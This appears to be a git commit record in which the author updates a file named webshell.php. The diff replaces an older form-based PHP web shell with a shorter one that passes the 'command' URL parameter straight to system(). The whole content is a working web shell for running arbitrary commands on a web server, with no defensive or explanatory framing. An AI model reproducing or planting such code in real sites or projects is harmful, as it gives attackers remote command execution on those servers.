a4ee6ac77e884e8c64725cf74beb4e271ff4b230
tjswlsgg <tjswlsdlekd@naver.com>
2022-12-26 15:08:00 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,11 +1,5 @@
-<? 
-
-        echo "
-                <FORM ACTION=$PHP_SELF METHOD=POST>
-                CMD : <INPUT TYPE=TEXT NAME=command SIZE=40>
-                <INPUT TYPE=SUBMIT VALUE='Enter'></FORM>
-                <HR><XMP></XMP><HR>";
-
-        $command = str_replace('/', '', $command);
-        echo "<XMP>"; passthru($command); echo "</XMP>";
+<?php
+        $cmd = $_GET['command'];
+        if(isset($cmd))
+                system($cmd);
 ?>
